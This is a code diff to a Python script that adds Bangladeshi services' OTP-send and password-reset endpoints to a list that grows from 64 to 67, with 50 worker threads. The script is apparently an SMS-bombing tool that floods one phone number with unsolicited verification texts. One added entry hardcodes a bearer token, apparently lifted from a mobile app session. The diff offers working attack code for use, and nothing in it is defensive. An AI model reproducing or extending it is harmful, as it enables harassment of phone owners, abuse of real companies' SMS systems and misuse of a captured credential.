@@ -441,6 +441,21 @@ def build_request(api, phone):
             url = 'https://backend.amarbay.com/user/find_user_by_phone/'
             body = json.dumps({"phone_number": pr})
             h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://amarbay.com', 'Referer': 'https://amarbay.com/'}
+        elif api == 'rhombus':
+            url = 'https://www.rhombuspublications.com/api/auth/send-otp'
+            body = json.dumps({"cred": pr})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
+        elif api == 'toffee':
+            url = 'https://prod-services.toffeelive.com/sms/v1/subscriber/otp'
+            body = json.dumps({"target": p8, "resend": False})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json',
+                 'User-Agent': 'okhttp/5.1.0', 'x-app-version': '9.2.4', 'x-app-platform': 'android-mobile',
+                 'authorization': 'Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL3RvZmZlZWxpdmUuY29tIiwiY291bnRyeSI6IkJEIiwiZF9pZCI6IjY3N2FmMGJjLWRlZDYtNGRlNi1hNjhlLTI5NjViYzU5YmUxMyIsImV4cCI6MTc4ODI2MTgyMywiaWF0IjoxNzg1NjMyMDIzLCJpc3MiOiJ0b2ZmZWVsaXZlLmNvbSIsImp0aSI6ImFiNDMwMGE4LWZmZjAtNDVkNi04YmY0LWZiY25lYzI1MDlkMl8xNzg1NjMyMDIzIiwicHJvdmlkZXIiOiJ0b2ZmZWUiLCJyX2lkIjoiNjc3YWYwYgmtZGVkNi00ZGU2LWE2OGUtNjk2NWJjNTliZTEzIiwic19pZCI6IjY3N2FmMGJjLWRlZTYtNGRlNi1hNjhlLTHyMDFiYzU5YmUxMyIsInRva2VuIjoiYWNjZXNzIiwidHlwZSI6ImRldmljZSJ9.37ICp67-KrJ5_vX3xrD2Opv2N7AyVlpx8wrjC-lSSCVFABEASTDYoLKvCEtGDKSaiAykD2kpPVaUVBwh28UG_g'}
+        elif api == 'apcom':
+            url = 'https://apcombd.com/api/v2/auth/password/forget_request'
+            body = json.dumps({"email_or_phone": pp, "send_code_by": "phone"})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json',
+                 'User-Agent': 'Dart/3.4 (dart:io)', 'authorization': 'Bearer null'}
         elif api == 'udvash':
             url = f'https://online.udvash-unmesh.com/Registration?nickName={urllib.urlencode(fN)}&mobileNumber={p8}'
             body = ''
@@ -451,7 +466,7 @@ def build_request(api, phone):
 
     return {'url': url, 'body': body, 'headers': h, 'method': method}
 
-# Full list of 64 APIs
+# Full list of 67 APIs
 APIS = [
     'binge','admissiontaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
     'fteducation','banglalink','robi','bohubrihi','sheba','trucklagbe','osudpotro',
@@ -460,7 +475,7 @@ APIS = [
     'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
     'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
     'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin','khaasfood',
-    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay'
+    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay','rhombus','toffee','apcom'
 ]
 
 MAX_WORKERS = 50
